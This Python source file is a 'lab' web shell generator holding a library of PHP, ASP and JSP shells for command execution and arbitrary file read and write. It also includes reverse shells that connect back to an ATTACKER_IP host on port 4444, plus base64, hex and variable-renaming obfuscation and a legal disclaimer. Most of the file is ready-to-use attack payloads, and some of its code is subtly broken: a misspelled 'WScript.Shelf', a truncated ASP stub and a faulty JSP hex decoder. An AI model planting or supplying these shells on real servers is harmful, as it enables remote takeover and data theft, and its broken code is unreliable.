#!/usr/bin/env python3
"""WEB10 — Web Shell Generator (Lab).

Educational PHP/ASP/JSP web shell payload generator for lab testing.
Produces text files of obfuscated payloads with an HTML report of artifacts.
Standard-library only; demo generates sample payloads to a temp directory.
"""

import base64
import hashlib
import os
import random
import string
import tempfile
import textwrap
import time
import html as html_mod


# ---------------------------------------------------------------------------
# Payload library
# ---------------------------------------------------------------------------

PAYLOAD_LIBRARY = {
    "php": {
        "command_exec": {
            "description": "Execute system commands via shell_exec / passthru",
            "severity": "CRITICAL",
            "payloads": [
                '<?php echo shell_exec($_GET["cmd"]); ?>',
                '<?php passthru($_REQUEST["c"]); ?>',
                '<?php echo system($_POST["cmd"]); ?>',
                '<?php $o=[];exec($_GET["cmd"],$o);echo implode("\\n",$o); ?>',
                '<?php $c=$_GET["c"];echo `$c`; ?>',
            ],
        },
        "file_read": {
            "description": "Read arbitrary files from the server filesystem",
            "severity": "HIGH",
            "payloads": [
                '<?php echo file_get_contents($_GET["f"]); ?>',
                '<?php readfile($_REQUEST["file"]); ?>',
                '<?php echo implode("",file($_POST["f"])); ?>',
                '<?php $f=fopen($_GET["f"],"r");echo fread($f,filesize($_GET["f"]));fclose($f); ?>',
            ],
        },
        "file_write": {
            "description": "Write arbitrary files to the server filesystem",
            "severity": "CRITICAL",
            "payloads": [
                '<?php file_put_contents($_GET["f"],base64_decode($_POST["d"])); ?>',
                '<?php $f=fopen($_GET["f"],"w");fwrite($f,base64_decode($_REQUEST["d"]));fclose($f); ?>',
            ],
        },
        "reverse_shell": {
            "description": "Reverse shell stub connecting back to attacker",
            "severity": "CRITICAL",
            "payloads": [
                '<?php $sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>',
                '<?php $s=@fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3",$o,$e); ?>',
            ],
        },
        "info_disclosure": {
            "description": "Display server configuration and environment variables",
            "severity": "MEDIUM",
            "payloads": [
                '<?php phpinfo(); ?>',
                '<?php echo "OS: ".php_uname()."<br>PHP: ".phpversion(); ?>',
                '<?php echo "Server: ".$_SERVER["SERVER_SOFTWARE"]." | DocRoot: ".$_SERVER["DOCUMENT_ROOT"]; ?>',
            ],
        },
    },
    "asp": {
        "command_exec": {
            "description": "Execute commands via WScript.Shell",
            "severity": "CRITICAL",
            "payloads": [
                '<% Dim c:Set c=Server.CreateObject("WScript.Shelf"):c.Run Request("cmd"),0,True:Response.Write "done" %>',
                '<% Set o=Server.CreateObject("WScript.Shell"):Set r=o.Exec("cmd /c "&Request("c")):Response.Write r.StdOut.ReadAll() %>',
            ],
        },
        "file_read": {
            "description": "Read files via Scripting.FileSystemObject",
            "severity": "HIGH",
            "payloads": [
                '<% Dim f:Set f=Server.CreateObject("Scripting.FileSystemObject"):Set t=f.OpenTextFile(Request("f"),1):Response.Write t.ReadAll():t.Close %>',
                '<% Response.Write CreateObject("Scripting.FileSystemObject").OpenTextFile(Request("f"),1).ReadAll() %>',
            ],
        },
        "file_write": {
            "description": "Write files via Scripting.FileSystemObject",
            "severity": "CRITICAL",
            "payloads": [
                '<% Dim f:Set f=Server.CreateObject("Scripting.FileSystemObject"):Set t=f.CreateTextFile(Request("f"),True):t.Write Request("d"):t.Close %>',
            ],
        },
        "reverse_shell": {
            "description": "Reverse shell via MSXML2.XMLHTTP and WScript.Shell",
            "severity": "CRITICAL",
            "payloads": [
                '<% Dim s:Set s=CreateObject("WScript.Shell"):s.Run "cmd /c powershell -c ""$c=New-Object Net.Sockets.TCPClient(ATTACKER_IP,4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=([text.encoding]::ASCII).GetBytes($o);$s.Write($p,0,$p.Length)}""",0,True %>',
            ],
        },
        "info_disclosure": {
            "description": "Display ASP server variables",
            "severity": "MEDIUM",
            "payloads": [
                '<% For Each k In Request.ServerVariables:Response.Write k & " = " & Request.ServerVariables(k) & "<br>":Next %>',
            ],
        },
    },
    "jsp": {
        "command_exec": {
            "description": "Execute commands via Runtime.getRuntime().exec()",
            "severity": "CRITICAL",
            "payloads": [
                '<% Runtime r=Runtime.getRuntime();Process p=r.exec(request.getParameter("cmd"));java.io.InputStream is=p.getInputStream();int a=-1;byte[] b=new byte[2048];while((a=is.read(b))!=-1){out.print(new String(b,0,a));} %>',
                '<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("c"));DataInputStream dis=new DataInputStream(p.getInputStream());String disr;while((disr=dis.readLine())!=null){out.println(disr);} %>',
            ],
        },
        "file_read": {
            "description": "Read files via FileInputStream",
            "severity": "HIGH",
            "payloads": [
                '<%@ page import="java.io.*" %><% BufferedReader br=new BufferedReader(new FileReader(request.getParameter("f")));String l;while((l=br.readLine())!=null){out.println(l);} %>',
            ],
        },
        "file_write": {
            "description": "Write files via FileOutputStream",
            "severity": "CRITICAL",
            "payloads": [
                '<%@ page import="java.io.*" %><% String d=request.getParameter("d");String f=request.getParameter("f");FileWriter fw=new FileWriter(f);fw.write(d);fw.close();out.println("Written to "+f); %>',
            ],
        },
        "reverse_shell": {
            "description": "Reverse shell stub via Socket and Runtime",
            "severity": "CRITICAL",
            "payloads": [
                '<%@ page import="java.io.*,java.net.*" %><% Socket s=new Socket("ATTACKER_IP",4444);Process p=Runtime.getRuntime().exec("/bin/sh");InputStream is=p.getInputStream();OutputStream os=s.getOutputStream();byte[] buf=new byte[1024];int len;while((len=is.read(buf))!=-1){os.write(buf,0,len);}os.flush(); %>',
            ],
        },
        "info_disclosure": {
            "description": "Display JVM and system properties",
            "severity": "MEDIUM",
            "payloads": [
                '<% out.println("OS: "+System.getProperty("os.name")+" "+System.getProperty("os.version")); out.println("Java: "+System.getProperty("java.version")); out.println("User: "+System.getProperty("user.name")); %>',
            ],
        },
    },
}


# ---------------------------------------------------------------------------
# Obfuscation helpers
# ---------------------------------------------------------------------------

def _random_var_name(length=8):
    """Generate a random alphanumeric variable name."""
    first = random.choice(string.ascii_lowercase)
    rest = "".join(random.choices(string.ascii_lowercase + string.digits, k=length - 1))
    return first + rest


def obfuscate_base64(payload):
    """Base64-encode a payload and wrap in a language-appropriate decoder stub."""
    encoded = base64.b64encode(payload.encode()).decode()
    stubs = {
        "php": (
            '<?php echo base64_decode("{enc}"); ?>'
        ),
        "asp": (
            '<% Response.Write CreateObject("MSXML2.DOMDocument").'
            'createElement("b64"): ... %>'
        ),
        "jsp": (
            '<% out.println(new String(java.util.Base64.getDecoder().decode("{enc}"))); %>'
        ),
    }
    lang = "php"
    if "<%" in payload and "=" in payload:
        lang = "asp"
    elif "<%" in payload and "import" in payload:
        lang = "jsp"
    elif "<%" in payload:
        lang = "jsp"
    template = stubs.get(lang, stubs["php"])
    return template.replace("{enc}", encoded)


def obfuscate_hex(payload):
    """Hex-encode each byte and wrap in a language decoder."""
    hex_str = payload.encode().hex()
    lang = "php"
    if "<%" in payload:
        lang = "jsp" if "import" in payload else "asp"
    if lang == "php":
        return '<?php echo hex2bin("{hex}"); ?>'.format(hex=hex_str)
    elif lang == "jsp":
        return (
            '<% byte[] b=new byte[{n}];'
            'for(int i=0;i<{n};i+=2){{b[i/2]=(byte)Integer.parseInt("{seg}",16);}}'
            'out.println(new String(b)); %>'
        ).format(n=len(hex_str) // 2, seg=hex_str[:2])
    else:
        return "<% 'hex obfuscation not supported for ASP in demo %>"


def obfuscate_randomize_vars(payload):
    """Replace common PHP variable names with random names."""
    replacements = {
        "$cmd": "$" + _random_var_name(),
        "$c": "$" + _random_var_name(),
        "$f": "$" + _random_var_name(),
        "$d": "$" + _random_var_name(),
        "$s": "$" + _random_var_name(),
        "$o": "$" + _random_var_name(),
        "$e": "$" + _random_var_name(),
    }
    result = payload
    for old, new in replacements.items():
        result = result.replace(old, new)
    return result


OBFUSCATORS = {
    "base64": obfuscate_base64,
    "hex": obfuscate_hex,
    "randomize_vars": obfuscate_randomize_vars,
}


# ---------------------------------------------------------------------------
# Generator
# ---------------------------------------------------------------------------

class WebShellGenerator:
    """Generate and obfuscate web shell payloads."""

    def __init__(self, output_dir=None):
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="webshell_")
        self.generated = []
        os.makedirs(self.output_dir, exist_ok=True)

    def list_payloads(self):
        """Return a structured listing of all available payloads."""
        listing = {}
        for lang, categories in PAYLOAD_LIBRARY.items():
            listing[lang] = {}
            for cat, info in categories.items():
                listing[lang][cat] = {
                    "description": info["description"],
                    "severity": info["severity"],
                    "count": len(info["payloads"]),
                }
        return listing

    def generate(self, languages=None, categories=None, obfuscation=None):
        """Generate payloads for the given languages/categories.

        Returns list of dicts with metadata for each generated artifact.
        """
        langs = languages or list(PAYLOAD_LIBRARY.keys())
        cats = categories or list(PAYLOAD_LIBRARY[list(PAYLOAD_LIBRARY.keys())[0]].keys())
        obf = obfuscation or []

        for lang in langs:
            if lang not in PAYLOAD_LIBRARY:
                continue
            for cat in cats:
                if cat not in PAYLOAD_LIBRARY[lang]:
                    continue
                info = PAYLOAD_LIBRARY[lang][cat]
                for idx, payload in enumerate(info["payloads"]):
                    variant = payload
                    applied_obf = []
                    for method in obf:
                        if method in OBFUSCATORS:
                            variant = OBFUSCATORS[method](variant)
                            applied_obf.append(method)

                    safe_cat = cat.replace(" ", "_")
                    fname = "{}_{}_{}".format(lang, safe_cat, idx + 1)
                    fpath = os.path.join(self.output_dir, fname + ".txt")

                    with open(fpath, "w") as fh:
                        fh.write("// WEB10 Lab Payload Generator\n")
                        fh.write("// Language: {}\n".format(lang.upper()))
                        fh.write("// Category: {}\n".format(cat))
                        fh.write("// Severity: {}\n".format(info["severity"]))
                        fh.write("// Obfuscation: {}\n".format(", ".join(applied_obf) or "none"))
                        fh.write("// " + "-" * 60 + "\n\n")
                        fh.write(variant + "\n")

                    sha = hashlib.sha256(variant.encode()).hexdigest()[:16]
                    self.generated.append({
                        "file": fpath,
                        "language": lang,
                        "category": cat,
                        "severity": info["severity"],
                        "obfuscation": applied_obf,
                        "sha256": sha,
                        "description": info["description"],
                        "size": os.path.getsize(fpath),
                    })

        return self.generated

    def generate_html_report(self, title="WEB10 Web Shell Lab Report"):
        """Generate an HTML report of all generated artifacts."""
        report_path = os.path.join(self.output_dir, "report.html")
        rows = []
        for g in self.generated:
            sev_color = {
                "CRITICAL": "#d32f2f",
                "HIGH": "#f57c00",
                "MEDIUM": "#fbc02d",
                "LOW": "#388e3c",
            }.get(g["severity"], "#757575")
            rows.append(
                '<tr>'
                '<td>{lang}</td>'
                '<td><a href="file://{fpath}">{cat}</a></td>'
                '<td style="color:{sev};font-weight:bold">{sev}</td>'
                '<td>{obf}</td>'
                '<td><code>{sha}</code></td>'
                '<td>{desc}</td>'
                '</tr>'.format(
                    lang=html_mod.escape(g["language"]),
                    fpath=html_mod.escape(g["file"]),
                    cat=html_mod.escape(g["category"]),
                    sev=sev_color,
                    obf=html_mod.escape(", ".join(g["obfuscation"]) or "none"),
                    sha=html_mod.escape(g["sha256"]),
                    desc=html_mod.escape(g["description"]),
                )
            )

        report = textwrap.dedent("""\
        <!DOCTYPE html>
        <html><head><meta charset="utf-8"><title>{title}</title>
        <style>
        body {{ font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 2em; }}
        h1 {{ color: #569cd6; border-bottom: 2px solid #569cd6; padding-bottom: 0.5em; }}
        table {{ border-collapse: collapse; width: 100%; margin-top: 1em; }}
        th, td {{ border: 1px solid #444; padding: 8px 12px; text-align: left; }}
        th {{ background: #264f78; color: #fff; }}
        tr:hover {{ background: #2a2d2e; }}
        a {{ color: #4ec9b0; }}
        code {{ background: #2d2d2d; padding: 2px 6px; border-radius: 3px; }}
        .disclaimer {{ background: #3c1e1e; border: 1px solid #d32f2f; padding: 1em; margin-top: 2em; border-radius: 5px; }}
        </style></head><body>
        <h1>{title}</h1>
        <p>Generated: {timestamp}</p>
        <p>Total artifacts: {count}</p>
        <table>
        <tr><th>Language</th><th>Category</th><th>Severity</th><th>Obfuscation</th><th>SHA256</th><th>Description</th></tr>
        {rows}
        </table>
        <div class="disclaimer">
        <h3>LEGAL DISCLAIMER — LAB USE ONLY</h3>
        <p>These payloads are generated for <strong>authorized lab testing only</strong>.
        Do NOT deploy on any system you do not own or have explicit written authorization to test.
        Unauthorized use violates the Computer Fraud and Abuse Act (CFAA) and applicable state laws.</p>
        </div>
        </body></html>
        """).format(
            title=html_mod.escape(title),
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
            count=len(self.generated),
            rows="\n".join(rows),
        )

        with open(report_path, "w") as fh:
            fh.write(report)
        return report_path

    def print_summary(self):
        """Print a summary of generated artifacts to stdout."""
        print("=" * 64)
        print("  WEB10 — Web Shell Generator (Lab)")
        print("  Generated Artifacts Summary")
        print("=" * 64)
        print()
        print("  Output directory: {}".format(self.output_dir))
        print("  Total artifacts:  {}".format(len(self.generated)))
        print()
        by_lang = {}
        for g in self.generated:
            by_lang.setdefault(g["language"], []).append(g)
        for lang, items in sorted(by_lang.items()):
            print("  [{}] {} payloads".format(lang.upper(), len(items)))
            by_cat = {}
            for g in items:
                by_cat.setdefault(g["category"], []).append(g)
            for cat, cat_items in sorted(by_cat.items()):
                print("    - {}: {} (obfuscation: {})".format(
                    cat, len(cat_items),
                    ", ".join(cat_items[0]["obfuscation"]) or "none",
                ))
        print()
        print("  HTML report: report.html in output directory")
        print("=" * 64)


# ---------------------------------------------------------------------------
# Demo
# ---------------------------------------------------------------------------

def demo():
    """Run the self-contained demo: generate sample payloads and print them."""
    print("=" * 64)
    print("  WEB10 — Web Shell Generator (Lab) — Demo Mode")
    print("=" * 64)
    print()

    gen = WebShellGenerator()

    print("[*] Available payload library:")
    listing = gen.list_payloads()
    for lang, cats in listing.items():
        print("  [{}]".format(lang.upper()))
        for cat, info in cats.items():
            print("    {}: {} ({} payloads, severity={})".format(
                cat, info["description"], info["count"], info["severity"],
            ))
    print()

    print("[*] Generating payloads (all languages, all categories, no obfuscation)...")
    results = gen.generate()
    gen.print_summary()
    print()

    print("[*] Sample payload (PHP command_exec #1):")
    php_sample = os.path.join(gen.output_dir, "php_command_exec_1.txt")
    if os.path.exists(php_sample):
        with open(php_sample) as f:
            for line in f:
                print("    {}".format(line.rstrip()))
    print()

    print("[*] Generating with obfuscation (base64 + hex)...")
    gen2 = WebShellGenerator()
    obf_results = gen2.generate(
        languages=["php"],
        categories=["command_exec", "file_read"],
        obfuscation=["base64", "hex"],
    )
    print("  Generated {} obfuscated payloads".format(len(obf_results)))
    for g in obf_results:
        print("    {} / {} [obf: {}]".format(
            g["language"], g["category"], ", ".join(g["obfuscation"]),
        ))
    print()

    print("[*] Generating HTML report...")
    report_path = gen.generate_html_report()
    print("  Report written to: {}".format(report_path))

    print()
    print("[*] Demo complete. All artifacts in: {}".format(gen.output_dir))
    print()
    print("=" * 64)
    print("  LEGAL: This tool is for lab/authorized testing only.")
    print("  Deploying web shells on systems you do not own is illegal")
    print("  under the CFAA (18 U.S.C. § 1030) and state laws.")
    print("=" * 64)


if __name__ == "__main__":
    demo()
